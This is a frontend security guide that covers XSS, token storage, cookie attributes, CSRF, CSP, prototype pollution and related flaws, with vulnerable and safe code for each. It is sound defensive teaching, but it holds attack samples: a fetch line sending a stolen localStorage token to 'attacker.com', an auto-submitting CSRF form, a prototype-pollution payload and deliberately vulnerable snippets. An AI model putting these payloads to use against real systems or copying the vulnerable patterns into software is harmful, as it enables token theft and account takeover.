# Frontend Security Vulnerabilities

This guide covers common security vulnerabilities in frontend applications, their impact, and the standard mitigation strategies developers use to address them.

## 1. Cross-Site Scripting (XSS)

### What it is

XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. The browser executes these scripts in the context of the vulnerable site, allowing attackers to steal sensitive data, hijack user sessions, or perform unauthorized actions.

### Types of XSS

- **Stored XSS**: Malicious script is permanently stored on the target server (e.g., in a database)
- **Reflected XSS**: Script is reflected off a web server (e.g., in error messages or search results)
- **DOM-based XSS**: Vulnerability exists in client-side code rather than server-side

### Common attack vectors

- Rendering unsanitized user input with `dangerouslySetInnerHTML`
- Inserting user data into HTML attributes or event handlers
- Processing untrusted HTML, Markdown, or rich text without sanitization
- Using `eval()` or similar functions with user input

### Example vulnerable code

```jsx
// VULNERABLE: Direct rendering of user input
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// VULNERABLE: Dynamic attribute injection


// VULNERABLE: Event handler injection
<button onClick={new Function(userCode)}>Click</button>
```

### Mitigation strategies

1. **Default escaping**: Use React's default text rendering (it auto-escapes)
2. **Sanitization libraries**: Use DOMPurify for rich text/HTML sanitization
3. **Content Security Policy (CSP)**: Implement strict CSP headers to block inline scripts
4. **Avoid dangerous APIs**: Minimize use of `dangerouslySetInnerHTML`, `eval()`, `Function()`
5. **Input validation**: Validate and sanitize on both frontend (UX) and backend (security)
6. **Context-aware encoding**: Use appropriate encoding for HTML, JavaScript, URL contexts

```jsx
// SAFE: React's default rendering
<div>{userComment}</div>

// SAFE: Sanitized HTML
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />
```

## 2. Insecure Authentication Token Storage

### What it is

Authentication tokens (JWTs, session tokens) stored insecurely can be accessed by malicious scripts, leading to session hijacking and account takeover.

### Common vulnerabilities

- Storing tokens in `localStorage` or `sessionStorage`
- Exposing tokens in URL parameters
- Storing tokens in cookies without proper flags
- Long-lived tokens without rotation

### Why localStorage is vulnerable

JavaScript code (including XSS attacks) can freely read `localStorage`, making any XSS vulnerability a potential account takeover.

```js
// VULNERABLE: Token accessible to any script
localStorage.setItem("authToken", jwt);

// Attacker's XSS payload can steal it
const token = localStorage.getItem("authToken");
fetch("https://attacker.com/steal?token=" + token);
```

### Mitigation strategies

1. **HttpOnly cookies**: Store sensitive tokens in cookies with `HttpOnly` flag (JavaScript cannot access)
2. **Secure flag**: Always use `Secure` flag to ensure HTTPS-only transmission
3. **SameSite attribute**: Use `SameSite=Strict` or `Lax` to prevent CSRF
4. **Short-lived tokens**: Keep access tokens short-lived (5-15 minutes)
5. **Token rotation**: Implement refresh token rotation
6. **Server-side sessions**: Consider server-side session management for highest security

```http
Set-Cookie: accessToken=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=900
```

### Cookie security attributes explained

When setting cookies, various attributes control their security behavior. Understanding these is critical for protecting authentication tokens and sensitive data.

#### HttpOnly

**What it does**: Prevents JavaScript from accessing the cookie via `document.cookie`

**Why it matters**: Protects against XSS attacks. Even if an attacker injects malicious script, they cannot steal HttpOnly cookies.

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

**Use case**: Session tokens, refresh tokens, any authentication-related cookies

**Not suitable for**: Data that needs to be read by client-side JavaScript (e.g., user preferences, feature flags)

#### Secure

**What it does**: Cookie is only sent over HTTPS connections, never over plain HTTP

**Why it matters**: Prevents man-in-the-middle attacks from intercepting cookies over insecure connections

```http
Set-Cookie: sessionId=abc123; Secure
```

**Use case**: All cookies in production environments. Should be combined with other security attributes.

**Note**: In development (localhost), browsers typically allow Secure cookies even over HTTP

#### SameSite

**What it does**: Controls whether cookies are sent with cross-site requests

**Values**:

- **`SameSite=Strict`**: Cookie is never sent on cross-site requests, only when navigating to the origin site directly
  - Most secure option
  - Use for: Session cookies, authentication tokens
  - Drawback: Won't be sent if user clicks link from external site (e.g., email, social media)

- **`SameSite=Lax`** (default in modern browsers): Cookie is sent on top-level navigation with safe methods (GET) but not on cross-site subrequests (images, iframes)
  - Good balance of security and usability
  - Use for: Most authentication scenarios
  - Prevents CSRF on POST/PUT/DELETE while allowing legitimate cross-site GET navigation

- **`SameSite=None`**: Cookie is sent on all cross-site requests
  - Requires `Secure` attribute
  - Use for: Third-party cookies, embedded widgets, cross-domain APIs
  - Least secure option

```http
# Strict - Maximum protection
Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure

# Lax - Good default
Set-Cookie: session=abc123; SameSite=Lax; HttpOnly; Secure

# None - For cross-site scenarios (must be Secure)
Set-Cookie: widget=xyz; SameSite=None; Secure
```

**Comparison table**:

| Scenario | Strict | Lax | None |
|----------|--------|-----|------|
| User clicks link from external site | ❌ Not sent | ✅ Sent | ✅ Sent |
| Form POST from external site | ❌ Not sent | ❌ Not sent | ✅ Sent |
| Ajax/Fetch from external site | ❌ Not sent | ❌ Not sent | ✅ Sent |
| Image/iframe from external site | ❌ Not sent | ❌ Not sent | ✅ Sent |
| Same-site requests | ✅ Sent | ✅ Sent | ✅ Sent |

#### Domain

**What it does**: Specifies which hosts can receive the cookie

```http
# Cookie available only to api.example.com
Set-Cookie: token=abc; Domain=api.example.com

# Cookie available to all subdomains of example.com
Set-Cookie: token=abc; Domain=.example.com
```

**Security tip**: Be specific. Avoid setting Domain to a broad scope unless necessary, as it increases attack surface.

#### Path

**What it does**: Restricts cookie to specific URL paths

```http
# Cookie only sent for /app/* paths
Set-Cookie: token=abc; Path=/app

# Cookie sent for all paths (default)
Set-Cookie: token=abc; Path=/
```

**Security note**: Path is not a strong security boundary. Use it for organization, not security.

#### Max-Age and Expires

**What they do**: Control cookie lifetime

- **Max-Age**: Seconds until cookie expires (modern, preferred)
- **Expires**: Specific date/time when cookie expires (legacy)

```http
# Expires in 1 hour (3600 seconds)
Set-Cookie: session=abc; Max-Age=3600

# Expires at specific date
Set-Cookie: session=abc; Expires=Wed, 21 Oct 2026 07:28:00 GMT

# Session cookie (deleted when browser closes)
Set-Cookie: session=abc
```

**Best practices**:
- Short-lived access tokens: 5-15 minutes (`Max-Age=900`)
- Refresh tokens: 7-30 days (`Max-Age=604800` to `2592000`)
- Remember-me: Up to 1 year (`Max-Age=31536000`)

#### Recommended cookie configurations

```http
# Session/Access Token (high security)
Set-Cookie: accessToken=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=900

# Refresh Token (long-lived)
Set-Cookie: refreshToken=xyz789; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh; Max-Age=2592000

# User Preference (readable by JS)
Set-Cookie: theme=dark; Secure; SameSite=Lax; Max-Age=31536000

# Third-party Widget
Set-Cookie: widgetId=123; Secure; SameSite=None; Max-Age=3600
```

## 3. Cross-Site Request Forgery (CSRF)

### What it is

CSRF tricks a user's browser into making unwanted requests to a site where they're authenticated. The browser automatically sends authentication cookies, making the request appear legitimate.

### How it works

1. User is logged into `bank.com` with a valid session cookie
2. User visits attacker's site `evil.com`
3. Attacker's page triggers a request to `bank.com/transfer`
4. Browser automatically includes session cookies
5. `bank.com` processes the request as legitimate

### Example attack

```html
<!-- Attacker's malicious page -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker" />
</form>
<script>document.forms[0].submit();</script>
```

### Mitigation strategies

1. **SameSite cookies**: Set `SameSite=Lax` or `Strict` on session cookies
2. **CSRF tokens**: Include unpredictable tokens in state-changing requests
3. **Double-submit cookies**: Send cookie value in both cookie and request body
4. **Origin/Referer validation**: Check `Origin` and `Referer` headers
5. **Custom headers**: Require custom headers (e.g., `X-Requested-With`)

```jsx
// Frontend sends CSRF token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ amount: 100, to: 'recipient' })
});
```

### CSRF Token Flow

The following diagram illustrates how CSRF tokens are generated, distributed, and validated:

```plantuml
@startuml
autonumber
actor User
participant Browser
participant "Backend Server" as Backend
database "Session Store" as Session

== Token Generation ==
User -> Browser: Navigate to site
Browser -> Backend: GET /login
Backend -> Backend: Generate CSRF token\n(cryptographically random)
Backend -> Session: Store token with session\ntoken: "9f82kls9d"
Backend --> Browser: Set-Cookie: sessionId=abc123\n+ Return HTML with CSRF token\n(in form or meta tag)
Browser -> Browser: Store CSRF token\n(in JS variable or form field)

== State-Changing Request ==
User -> Browser: Submit form / Make API call
Browser -> Backend: POST /api/transfer\nCookie: sessionId=abc123\nX-CSRF-Token: 9f82kls9d\nBody: {amount: 100, to: "recipient"}

== Token Validation ==
Backend -> Backend: Extract sessionId from cookie
Backend -> Session: Get stored CSRF token\nfor session "abc123"
Session --> Backend: Return token "9f82kls9d"
Backend -> Backend: Compare stored token\nwith received token

alt Tokens match
    Backend -> Backend: Process request
    Backend --> Browser: 200 OK\n{success: true}
    Browser --> User: Show success
else Tokens don't match OR token missing
    Backend --> Browser: 403 Forbidden\n{error: "Invalid CSRF token"}
    Browser --> User: Show error
end

== Attacker Scenario ==
actor Attacker
participant "Attacker's Site" as Evil

User -> Evil: Visit malicious site
Evil -> Browser: Inject hidden form\n<form action="bank.com/transfer">\n<input name="amount" value="10000">\n</form>
Evil -> Browser: Auto-submit form
Browser -> Backend: POST /api/transfer\nCookie: sessionId=abc123\n(NO CSRF token OR wrong token)\nBody: {amount: 10000, to: "attacker"}
Backend -> Backend: Check CSRF token
Backend -> Backend: Token missing/invalid!
Backend --> Browser: 403 Forbidden\n{error: "Invalid CSRF token"}
note right
  Attacker cannot obtain the CSRF token
  because it's either:
  1. In HttpOnly cookie (can't read via JS)
  2. In the page HTML (different origin)
  3. Returned via API (same-origin policy blocks it)
end note
@enduml
```



### Implementation examples

**Backend - Token generation (Express.js)**:

```js
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: false }); // Use session storage

app.get('/form', csrfProtection, (req, res) => {
  // Send token to client
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/api/transfer', csrfProtection, (req, res) => {
  // Token validation happens automatically via middleware
  // If we reach here, token is valid
  processTransfer(req.body);
  res.json({ success: true });
});
```

**Frontend - Including token in requests**:

```jsx
// Option 1: From meta tag
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Option 2: From global variable
const csrfToken = window.__CSRF_TOKEN__;

// Option 3: Fetch from API
const response = await fetch('/api/csrf-token');
const { csrfToken } = await response.json();

// Include in all state-changing requests
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  credentials: 'include', // Important: send cookies
  body: JSON.stringify({ amount: 100, to: 'recipient' })
});
```

**HTML form with CSRF token**:

```html
<form action="/api/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{ csrfToken }}">
  <input type="number" name="amount">
  <input type="text" name="to">
  <button type="submit">Transfer</button>
</form>
```

## 4. Insufficient Content Security Policy (CSP)

### What it is

Content Security Policy is an HTTP header that controls which resources the browser can load and execute. Missing or weak CSP leaves applications vulnerable to XSS and data injection attacks.

### Common weaknesses

- No CSP header at all
- Using `'unsafe-inline'` or `'unsafe-eval'`
- Overly permissive allowlists (e.g., `script-src *`)
- Not updating CSP as application evolves

### Mitigation strategies

1. **Strict CSP**: Start with restrictive policies and relax as needed
2. **Nonce-based CSP**: Use cryptographic nonces for inline scripts
3. **Hash-based CSP**: Use hashes for specific inline scripts
4. **Report-only mode**: Test CSP with `Content-Security-Policy-Report-Only` first
5. **Regular audits**: Review and update CSP regularly

```http
// Strong CSP example
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-2726c7f26c'; 
  style-src 'self' 'nonce-2726c7f26c'; 
  img-src 'self' https://cdn.example.com; 
  connect-src 'self' https://api.example.com;
```

## 5. Client-Side Authorization Vulnerabilities

### What it is

Relying on frontend code to enforce access control or permissions creates a false sense of security. Attackers can bypass client-side restrictions by manipulating code or requests.

### Common mistakes

- Hiding UI elements based on user roles (without backend enforcement)
- Trusting role/permission data sent from client
- Checking permissions only in frontend code
- Disabling buttons instead of enforcing server-side authorization

### Example vulnerability

```jsx
// VULNERABLE: Only hiding UI, not enforcing access
{isAdmin && <button onClick={deleteUser}>Delete User</button>}

// Attacker can still call deleteUser() or make direct API request
```

### Mitigation strategies

1. **Server-side enforcement**: All authorization checks must happen on the backend
2. **API-level validation**: Backend validates permissions for every request
3. **Principle of least privilege**: Grant minimum necessary permissions
4. **Frontend as UX**: Use client-side checks only for user experience
5. **Consistent validation**: Ensure frontend and backend use same permission logic

```jsx
// GOOD: UI reflects state, but backend enforces
{isAdmin && <button onClick={deleteUser}>Delete User</button>}

// Backend always validates
app.delete('/api/users/:id', async (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Proceed with deletion
});
```

## 6. Sensitive Data Exposure

### What it is

Unintentionally exposing sensitive information through frontend code, logs, APIs, or build artifacts.

### Common exposure points

- API keys or secrets in JavaScript bundles
- Sensitive data in client-side logs
- Excessive data in API responses
- Source maps in production
- Personally Identifiable Information (PII) in URLs or analytics
- Internal system information in error messages

### Example vulnerabilities

```js
// VULNERABLE: Secrets in frontend code
const API_KEY = "sk_live_51234567890abcdef";

// VULNERABLE: Logging sensitive data
console.log("User data:", { ssn: user.ssn, creditCard: user.cc });

// VULNERABLE: Exposing too much data
fetch('/api/users/123').then(r => r.json()); 
// Returns: { id, email, password_hash, internal_notes, ... }
```

### Mitigation strategies

1. **Environment variables**: Use environment variables for configuration, never commit secrets
2. **Backend proxy**: Proxy third-party API calls through your backend
3. **Remove debug logs**: Strip `console.log` and debug code in production builds
4. **Minimize API responses**: Return only necessary data to clients
5. **Disable source maps**: Remove or protect source maps in production
6. **Sanitize errors**: Show generic error messages to users, log details server-side
7. **Data minimization**: Don't send sensitive data to the frontend unless absolutely necessary

```js
// GOOD: API key stays on backend
// Frontend calls your backend
fetch('/api/proxy/external-service', {
  method: 'POST',
  body: JSON.stringify(data)
});

// Backend makes the actual API call
app.post('/api/proxy/external-service', async (req, res) => {
  const response = await fetch('https://external-api.com/endpoint', {
    headers: { 'Authorization': `Bearer ${process.env.API_KEY}` }
  });
  res.json(await response.json());
});
```

## 7. Insecure Dependencies

### What it is

Using npm packages with known security vulnerabilities or malicious code can compromise your entire application.

### Common risks

- Outdated dependencies with known CVEs
- Malicious packages (typosquatting, compromised maintainer accounts)
- Transitive dependencies with vulnerabilities
- Lack of dependency auditing

### Mitigation strategies

1. **Regular audits**: Run `npm audit` or `yarn audit` regularly
2. **Automated updates**: Use Dependabot or Renovate for dependency updates
3. **Lock files**: Commit `package-lock.json` or `yarn.lock` to version control
4. **Minimal dependencies**: Reduce attack surface by minimizing dependencies
5. **Verify packages**: Check package popularity, maintenance status, and reputation
6. **Security scanning**: Integrate security scanning in CI/CD pipeline
7. **Subresource Integrity (SRI)**: Use SRI for CDN-hosted resources

```html
<!-- Using SRI for CDN resources -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous">
</script>
```

## 8. Open Redirects

### What it is

Unvalidated redirects that allow attackers to redirect users to malicious sites, often used in phishing attacks.

### Common vulnerability patterns

```jsx
// VULNERABLE: Redirect to user-controlled URL
const redirectUrl = new URLSearchParams(window.location.search).get('redirect');
window.location.href = redirectUrl; // Could be https://evil.com

// VULNERABLE: Open redirect in navigation
<a href={userProvidedUrl}>Click here</a>
```

### Mitigation strategies

1. **Allowlist validation**: Only allow redirects to known, safe URLs
2. **Relative URLs**: Prefer relative URLs over absolute URLs
3. **URL parsing**: Validate protocol, domain, and path
4. **Indirect references**: Use tokens/IDs instead of direct URLs

```jsx
// GOOD: Validate against allowlist
const ALLOWED_REDIRECTS = ['/dashboard', '/profile', '/settings'];
const redirect = params.get('redirect');
if (ALLOWED_REDIRECTS.includes(redirect)) {
  navigate(redirect);
} else {
  navigate('/dashboard'); // Safe default
}
```

## 9. Clickjacking

### What it is

Embedding your site in an invisible iframe to trick users into clicking on hidden elements, performing unintended actions.

### Mitigation strategies

1. **X-Frame-Options header**: Prevent framing by other sites
2. **CSP frame-ancestors**: Modern alternative to X-Frame-Options
3. **Frame-busting scripts**: Break out of frames (legacy approach)

```http
X-Frame-Options: DENY
# or
X-Frame-Options: SAMEORIGIN

# CSP alternative
Content-Security-Policy: frame-ancestors 'self'
```

## 10. Prototype Pollution

### What it is

Modifying JavaScript object prototypes to inject properties that affect all objects, potentially leading to security issues.

### Common vulnerability

```js
// VULNERABLE: Merging untrusted objects
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}

// Attacker payload
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// Now ALL objects have isAdmin: true
```

### Mitigation strategies

1. **Object.create(null)**: Use prototype-less objects for data storage
2. **Object.freeze()**: Freeze prototypes in critical code
3. **Validation**: Validate object keys, reject `__proto__`, `constructor`, `prototype`
4. **Safe libraries**: Use maintained libraries with prototype pollution fixes
5. **Map over objects**: Use `Map` instead of plain objects for user data

```js
// GOOD: Using Map
const userData = new Map();
userData.set(userKey, userValue); // No prototype pollution risk

// GOOD: Key validation
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    target[key] = source[key];
  }
}
```

## General Security Best Practices

1. **Defense in depth**: Layer multiple security controls
2. **Least privilege**: Grant minimal necessary permissions
3. **Input validation**: Validate all user input (but don't rely on it for security)
4. **Output encoding**: Encode data appropriately for the context
5. **Security headers**: Implement comprehensive security headers
6. **HTTPS everywhere**: Use HTTPS for all communications
7. **Regular updates**: Keep dependencies and frameworks updated
8. **Security testing**: Include security testing in your development workflow
9. **Code reviews**: Review code for security issues
10. **Security training**: Keep team educated on security best practices
